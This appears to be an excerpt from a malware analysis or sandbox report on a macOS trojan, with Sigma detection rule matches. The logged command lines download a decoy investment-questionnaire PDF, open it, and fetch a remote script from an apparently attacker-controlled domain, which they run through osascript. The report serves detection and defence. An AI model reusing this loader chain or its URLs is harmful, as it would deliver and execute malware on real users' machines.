threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description: Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.

match_context.values: @{CommandLine=sh -c (curl -o '/Users/Shared/Investment Decision-Making Questionnaire.pdf' 'https://filedn.com/lY24cv0IfefboNEIN0I9gqR/dragonfly/Investment%20Decision-Making%20Questionnaire_Sunrise.pdf' || true) && (open '/Users/Shared/Investment Decision-Making Questionnaire.pdf' || true) && (shell=$(curl -L -k 'https://support.cloudstore.business/677984/check')  osascript -e 'do shell script $shell'); Image=sh; EventID=1}

@{CommandLine=/bin/bash sh -c (curl -o '/Users/Shared/Investment Decision-Making Questionnaire.pdf' 'https://filedn.com/lY24cv0IfefboNEIN0I9gqR/dragonfly/Investment%20Decision-Making%20Questionnaire_Sunrise.pdf' || true) && (open '/Users/Shared/Investment Decision-Making Questionnaire.pdf' || true) && (shell=$(curl -L -k 'https://support.cloudstore.business/677984/check')  osascript -e 'do shell script $shell'); Image=/bin/bash; EventID=1}

sigma_analysis_results.rule_description: Detects execution of AppleScript of the macOS scripting language AppleScript.

match_context.values: @{CommandLine=/usr/bin/osascript osascript -e do shell script; Image=/usr/bin/osascript; EventID=1}
